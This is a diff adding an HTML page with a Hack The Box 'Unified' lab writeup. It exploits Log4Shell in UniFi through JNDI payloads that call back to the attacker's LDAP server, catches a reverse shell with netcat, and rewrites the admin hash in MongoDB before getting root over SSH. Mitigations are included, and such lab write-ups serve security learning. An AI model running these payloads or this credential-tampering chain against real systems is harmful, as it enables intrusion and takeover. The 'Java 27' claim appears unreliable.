@@ -1,0 +1,155 @@
+<!doctype html>
+<html lang="en" data-theme="dark">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Unified — Hack The Box writeup | Farhan Hussain</title>
+<meta name="description" content="UniFi Network Application 6.4.54 running on port 8443 is vulnerable to Log4Shell (CVE-2021-44228). The login endpoint logs the username and remember POST…">
+<link rel="canonical" href="https://thecyberfarhan.github.io/writeups/unified.html">
+<meta property="og:title" content="Unified — Hack The Box writeup">
+<meta property="og:description" content="UniFi Network Application 6.4.54 running on port 8443 is vulnerable to Log4Shell (CVE-2021-44228). The login endpoint logs the username and remember POST…">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://thecyberfarhan.github.io/writeups/unified.html">
+<meta name="twitter:card" content="summary">
+<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Crect width='32' height='32' rx='7' fill='%23161b22'/%3E%3Crect x='1' y='1' width='30' height='30' rx='6' fill='none' stroke='%23B4232C' stroke-width='2'/%3E%3Ctext x='16' y='22' font-family='Arial' font-size='18' font-weight='700' text-anchor='middle' fill='%23e6edf3'%3EF%3C/text%3E%3C/svg%3E">
+<link rel="stylesheet" href="writeup.css">
+<script type="application/ld+json">{"@context":"https://schema.org","@type":"TechArticle","headline":"Unified — Hack The Box writeup","description":"UniFi Network Application 6.4.54 running on port 8443 is vulnerable to Log4Shell (CVE-2021-44228). The login endpoint logs the username and remember POST…","author":{"@id":"https://thecyberfarhan.github.io/#me"},"url":"https://thecyberfarhan.github.io/writeups/unified.html","mainEntityOfPage":"https://thecyberfarhan.github.io/writeups/unified.html"}</script>
+</head>
+<body>
+<div class="wrap">
+  <div class="topbar">
+    <a class="back" href="./">&larr; All writeups</a>
+    <a class="brand" href="https://thecyberfarhan.github.io/">Farhan<span>.</span></a>
+  </div>
+  <p class="eyebrow" data-reveal>Hack The Box writeup</p>
+  <h1 data-reveal>Unified</h1>
+  <div class="meta" data-reveal>
+    <span class="plat">Hack The Box</span>
+    <span class="diff">Very Easy</span>
+    
+  </div>
+  <div class="tldr" data-reveal><b>TL;DR</b>UniFi Network Application 6.4.54 running on port 8443 is vulnerable to Log4Shell (CVE-2021-44228). The login endpoint logs the <code>username</code> and <code>remember</code> POST parameters without sanitization, so injecting <code>${jndi:ldap://attacker:1389/o=tomcat}</code> into both fields triggers a JNDI lookup that fetches and executes a malicious payload from a rogue LDAP server. Shell lands as <code>unifi</code>. MongoDB is exposed locally on port 27117 with no authentication — connect, find the administrator's user document, replace the <code>x_shadow</code> field with a freshly-generated SHA-512 hash for a known password, then log into the UniFi web panel as <code>administrator</code>. The Site settings page exposes plaintext SSH root credentials. SSH in as root. </div>
+  <div class="tools"></div>
+  <h2 data-reveal>Introduction</h2>
+<p>Unified is a HTB Starting Point box built around one of the most impactful vulnerabilities of the last decade: Log4Shell (CVE-2021-44228). UniFi's Network Application runs on Java and logs user-supplied input through Log4j2 — which means anything the login endpoint logs is potentially a code execution vector. The JNDI lookup string <code>${jndi:ldap://...}</code> gets interpreted by Log4j before it hits any application logic, which is the kind of design decision that haunts you at 2 AM when the CVE drops.</p>
+<p>The escalation from <code>unifi</code> to <code>root</code> doesn't require any CVE — just the observation that the application's MongoDB backend is running locally with no authentication and stores admin credentials as replaceable SHA-512 hashes. Swap the hash, log in through the web UI, navigate to Site settings, and the box hands you the root SSH password in plaintext. It's almost polite.</p>
+<h2 data-reveal>Recon</h2>
+<h3>Port Scan</h3>
+<pre><code>rustscan -a 10.129.35.160 --ulimit 5000 -b 2000 -t 2000 -- -sV -sC</code></pre>
+<p>Six open ports:</p>
+<table><thead><tr><th>Port</th><th>Service</th><th>Notes</th></tr></thead><tbody><tr><td>22/tcp</td><td>SSH</td><td>OpenSSH 8.2p1 Ubuntu</td></tr><tr><td>6789/tcp</td><td>ibm-db2-admin?</td><td>UniFi inform port (device communication)</td></tr><tr><td>8080/tcp</td><td>HTTP</td><td>Apache Tomcat — redirects to <code>/manage</code></td></tr><tr><td>8443/tcp</td><td>HTTPS</td><td>UniFi web interface — <code>commonName=UniFi</code>, Ubiquiti Inc. certificate</td></tr><tr><td>8843/tcp</td><td>HTTPS</td><td>UniFi guest portal</td></tr><tr><td>8880/tcp</td><td>HTTP</td><td>UniFi HTTP portal redirect</td></tr></tbody></table>
+<p>The TLS certificate on 8443 is immediately revealing: <code>commonName=UniFi</code>, <code>organizationName=Ubiquiti Inc.</code> — this is the Ubiquiti UniFi Network Application. The certificate expired in April 2024, which is decorative at this point.</p>
+<p>Browsing to <code>https://10.129.35.160:8443/manage/account/login?redirect=%2Fmanage</code> confirmed the login portal.</p>
+<h3>Vulnerability Research</h3>
+<p>UniFi Network Application is a Java-based controller. The login endpoint processes user input through Log4j2 for logging purposes. CVE-2021-44228 (Log4Shell) affects Log4j2 versions 2.0-beta9 through 2.15.0 — any input that ends up in a log message can be processed as a lookup expression, and <code>${jndi:ldap://attacker/payload}</code> triggers an outbound LDAP connection that fetches and executes attacker-controlled Java code.</p>
+<p>UniFi 6.4.54 is within the vulnerable range. The <code>username</code> and <code>remember</code> POST fields in the login request are both logged — confirmed attack surface.</p>
+<h2 data-reveal>Foothold</h2>
+<h3>Setting Up the Exploit Chain</h3>
+<p>Two components needed: a rogue LDAP server to handle the JNDI callback, and a payload to deliver. The Log4jUnifi tool wraps both into a single Python script with a bundled rogue-jndi Java component.</p>
+<pre><code>mkdir -p ~/htb/unifi-log4shell &amp;&amp; cd ~/htb/unifi-log4shell
+git clone https://github.com/puzzlepeaches/Log4jUnifi
+cd Log4jUnifi</code></pre>
+<p>The <code>rogue-jndi</code> submodule wasn't initialized:</p>
+<pre><code>git submodule update --init --recursive
+# Clones https://github.com/veracode-research/rogue-jndi</code></pre>
+<p>Build the rogue JNDI server JAR (requires Maven and JDK 11):</p>
+<pre><code>sudo pacman -S maven jdk11-openjdk   # was missing on this machine
+mvn package -f utils/rogue-jndi/
+# BUILD SUCCESS — outputs RogueJndi-1.1.jar</code></pre>
+<p>Install Python dependencies:</p>
+<pre><code>pip install -r requirements.txt</code></pre>
+<h3>Why Not JNDI-Exploit-Kit</h3>
+<p>The first attempt used the generic JNDI-Exploit-Kit. It failed: that tool's gadget chains (Commons Collections, TemplatesImpl) rely on specific library versions in the target classpath, and UniFi's Java 27 runtime with strict module access blocked the <code>IllegalAccessError</code> paths. Log4jUnifi is built specifically for UniFi's runtime environment and uses a payload approach that works regardless.</p>
+<h3>Injecting the Payload</h3>
+<p>Started a listener on the attack box:</p>
+<pre><code>nc -lvnp 4444</code></pre>
+<p>Fired the exploit — the JNDI string goes into both the <code>username</code> and <code>remember</code> fields of the login JSON body:</p>
+<pre><code>python exploit.py -u https://10.129.35.160:8443 -i 10.10.14.92 -p 4444</code></pre>
+
+<pre><code>[*] Starting malicious JNDI Server
+{"username": "${jndi:ldap://10.10.14.92:1389/o=tomcat}", "password": "log4j", "remember": "${jndi:ldap://10.10.14.92:1389/o=tomcat}", "strict":true}
+[*] Firing payload!
+[*] Check for a callback!</code></pre>
+
+<h2 data-reveal>The Full Chain</h2>
+<h3>MongoDB — Credential Manipulation</h3>
+<p>Connect to the <code>ace</code> database (UniFi's default):</p>
+<pre><code>mongo --port 27117 ace</code></pre>
+<p>Enumerate admin users:</p>
+<pre><code>db.admin.find()</code></pre>
+<p>The <code>administrator</code> user document:</p>
+<pre><code>{ "_id" : ObjectId("61ce278f46e0fb0012d47ee4"),
+  "name" : "administrator",
+  "email" : "administrator@unified.htb",
+  "x_shadow" : "$6$Ry6Vdbse$8enMR5Znxoo.WfCMd/Xk65GwuQEPx1M.QP8/qHiQV0PvUc3uHuonK4WcTQFN1CRk3GwQaquyVwCVq8iQgPTt4.",
+  ...
+}</code></pre>
+<p><code>x_shadow</code> is the SHA-512 hashed password. Since SHA-512 can't be cracked quickly, the play is to replace it with a hash for a known password.</p>
+<p>On the attack box, generate a SHA-512 hash:</p>
+<pre><code>mkpasswd -m sha-512 Password123
+# $6$0Y3rY20e5mnCgb06$BeTJEFYWMmPuHqGNG2HbmPwwLhdvQgjg/FAz4l3mO9X...</code></pre>
+<p>Back in the MongoDB shell, update the administrator's hash:</p>
+<pre><code>db.admin.update(
+  {"_id": ObjectId("61ce278f46e0fb0012d47ee4")},
+  {$set: {"x_shadow": "$6$0Y3rY20e5mnCgb06$BeTJEFYWMmPuHqGNG2HbmPwwLhdvQgjg/FAz4l3mO9X.bQC7Rkf3w8OFU.nzfk8wWH8vPzf/uTRuAXBvids2e."}}
+)</code></pre>
+<h3>Web Panel  SSH Root Credentials</h3>
+<p>Logged into <code>https://10.129.35.160:8443/manage</code> as <code>administrator:Password123</code>.</p>
+<p>Navigated to <strong>Settings → Site</strong>. At the bottom of the page, under the SSH authentication section, plaintext credentials:</p>
+<pre><code>root : NotACrackablePassword4U2022</code></pre>
+<p>UniFi stores SSH root credentials for managed devices in plaintext in the Site configuration. Ironic name choice.</p>
+<h3>Root Shell</h3>
+<pre><code>ssh root@10.129.35.160
+# password: NotACrackablePassword4U2022</code></pre>
+
+<pre><code>root@unified:~# cat root.txt
+e50bc93c75b634e4b272d2f771c33681</code></pre>
+
+<h2 data-reveal>Rabbit Holes</h2>
+<p><strong>JNDI-Exploit-Kit:</strong> The first tool tried. Cloned the repo, confirmed the JAR was there, ran it against the target — no callback. The tool's gadget chains depend on specific classpath libraries that UniFi's environment didn't have in the right versions, and Java 27's module restrictions blocked the TemplatesImpl payload path. Wasted about 15 minutes before switching to the UniFi-specific tool.</p>
+<p><strong><code>ss</code> and <code>netstat</code> not in PATH:</strong> After landing the shell and trying to enumerate listening ports, <code>ss</code> and <code>netstat</code> both returned <code>command not found</code>. These tools exist on the box but aren't in the <code>unifi</code> user's PATH. <code>ps aux | grep mongo</code> is always a reliable fallback for finding running database services when network enumeration tools aren't accessible.</p>
+<p><strong>Typo on user flag path:</strong> <code>/home/michiael/user.txt</code> vs <code>/home/michael/user.txt</code>. <code>ls /home</code> would have been the better first move. One character off, two extra commands to correct it.</p>
+<p><strong>Running MongoDB commands outside the shell:</strong> Early in the session, MongoDB JavaScript syntax (<code>db.admin.update(...)</code>) was pasted into the bash shell instead of the MongoDB shell. Bash returned <code>syntax error near unexpected token '{'</code>. The fix was obvious but required recognizing that the MongoDB client session had to be active before running those commands.</p>
+<h2 data-reveal>Mitigations</h2>
+<p><strong>Log4Shell (CVE-2021-44228) — Upgrade Log4j2:</strong> The root cause is Log4j2 versions below 2.16.0 processing JNDI lookup expressions from user-controlled input. The fix is to upgrade to Log4j2 ≥ 2.16.0, which removed message lookup substitution entirely. As a temporary mitigation for older versions, setting <code>log4j2.formatMsgNoLookups=true</code> or removing the <code>JndiLookup</code> class from the classpath disables the vulnerable feature. UniFi Network Application ≥ 6.5.54 addressed this.</p>
+<p><strong>Unauthenticated MongoDB:</strong> The MongoDB instance ran on <code>127.0.0.1:27117</code> with no <code>--auth</code> flag, allowing any local user (including the <code>unifi</code> service account from the shell) to connect and modify any collection. MongoDB should be started with <code>--auth</code> enabled, and the UniFi application user should be granted only the minimum necessary database permissions (read/write to <code>ace</code>, not the ability to modify admin credentials).</p>
+<p><strong>Plaintext SSH Credentials in Web UI:</strong> The Site settings page exposed <code>root:NotACrackablePassword4U2022</code> in plaintext. SSH credentials for managed infrastructure should never be stored in plaintext in an application's web interface. Ubiquiti should use SSH key-based authentication for device management rather than storing passwords that any administrator-level web user can read.</p>
+<p><strong>SHA-512 Without Salt Control:</strong> The <code>x_shadow</code> field stored SHA-512 hashes, but the hash replacement attack worked because the database was writable without authentication and the hash could be substituted wholesale. Defense-in-depth would include database authentication (see above) and application-level integrity checks on credential fields, but the real fix is the MongoDB auth issue — without database write access, the hash replacement is impossible.</p>
+  <div class="takeaway" data-reveal><b>Key takeaway</b>Log4Shell is the cleanest example of why logging user-controlled input without sanitization is dangerous: the exploit isn't in the application logic, it's in the logging framework processing the data before the application even sees it. The JNDI lookup fires at the log statement — the rest of the application's input validation, authentication checks, and business logic all happen after the RCE has already occurred. There's no patch to the application that fixes this; it requires upgrading the library.  The escalation path reinforces the principle of least privilege for service accounts. The <code>unifi</code> OS user could connect to MongoDB and rewrite admin credentials because MongoDB had no authentication requirement. A properly configured environment would have MongoDB require authentication, the UniFi service account would have only the permissions it needs for application operation, and the SSH root credentials would never be stored in a plaintext-readable field in the application's web UI. Any one of those three controls breaks the escalation chain.</div>
+  <h2 data-reveal>If I Did It Again</h2>
+<p>I'd skip JNDI-Exploit-Kit entirely and go straight to Log4jUnifi. When the target is a specific known-vulnerable application (UniFi), a tool built for that application beats a generic one. The generic tool's gadget chains are a compatibility gamble; the specialized tool handles the environment specifics for you.</p>
+<p>For the MongoDB step — <code>ps aux | grep mongo</code> or <code>ps aux | grep 27</code> to find the port before even trying <code>ss</code> or <code>netstat</code>. Service processes listed in <code>ps</code> give you port numbers directly from their command-line arguments, and <code>ps</code> is almost always in PATH even when network tools aren't.</p>
+<p>The typo on the username path (<code>michiael</code> vs <code>michael</code>) is embarrassing in retrospect. <code>ls /home</code> takes two seconds and should always be the first step before guessing home directory names. Lesson noted, probably not learned permanently.</p>
+  <div class="cta-row">
+    <a class="btn primary" href="https://github.com/thecyberfarhan/CTF-Writeups/blob/main/HackTheBox/unified_writeup.md" target="_blank" rel="noopener">Full writeup on GitHub &rarr;</a>
+    <a class="btn" href="./">More writeups</a>
+  </div>
+  <footer>Part of <a href="https://thecyberfarhan.github.io/">thecyberfarhan.github.io</a>. Auto-generated from the <a href="https://github.com/thecyberfarhan/CTF-Writeups">CTF-Writeups</a> repo — edits happen there, not here.</footer>
+</div>
+<script>
+document.querySelectorAll('pre').forEach(function (pre) {
+  var btn = document.createElement('button');
+  btn.className = 'copy-btn';
+  btn.type = 'button';
+  btn.innerHTML = '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg><span>Copy</span>';
+  btn.addEventListener('click', function () {
+    var code = pre.querySelector('code');
+    var text = code ? code.textContent : pre.textContent;
+    navigator.clipboard.writeText(text).then(function () {
+      btn.classList.add('copied');
+      btn.querySelector('span').textContent = 'Copied';
+      setTimeout(function () { btn.classList.remove('copied'); btn.querySelector('span').textContent = 'Copy'; }, 1500);
+    }).catch(function () {});
+  });
+  pre.appendChild(btn);
+});
+if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+  var io = new IntersectionObserver(function (es) {
+    es.forEach(function (e) { if (e.isIntersecting) { e.target.classList.add('in'); io.unobserve(e.target); } });
+  }, { threshold: 0.1 });
+  document.querySelectorAll('[data-reveal]').forEach(function (el) { io.observe(el); });
+} else {
+  document.querySelectorAll('[data-reveal]').forEach(function (el) { el.classList.add('in'); });
+}</script>
+</body>
+</html>
